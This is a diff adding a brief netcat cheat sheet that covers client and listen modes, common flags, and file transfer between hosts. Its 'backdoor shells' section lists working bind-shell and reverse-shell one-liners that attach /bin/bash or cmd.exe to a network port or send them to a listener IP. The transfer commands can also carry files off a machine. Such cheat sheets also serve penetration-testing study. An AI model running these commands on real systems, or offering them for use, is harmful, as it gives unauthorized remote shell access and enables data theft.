@@ -1,0 +1,41 @@
+# client mode
+nc [target IP] [port]
+
+# listen mode
+nc -l -p [port]
+
+# common flags
+-L  persistent lisen
+-u  UDP mode
+-e  execute
+-n  don't perform DNS lookups
+-v  verbose
+-vv very verbose
+
+
+
+### backdoor shells
+# listening
+nc -l -p [port] -e /bin/bash
+nc -l -p [port] -e cmd.exe
+
+# reverse backdoor shell
+nc [listener IP] [port] -e /bin/bash
+nc [listener IP] [port] -e cmd.exe
+
+
+
+### transfer files
+# from client to listener
+nc -l -p [port] > [outfile]
+nc -w3 [listener IP] [port] < [infile]
+
+# from listener to client
+nc -l -p [port] < [infile]
+nc -w3 [listener IP] [port] > [outfile]
+
+
+
+
+
+
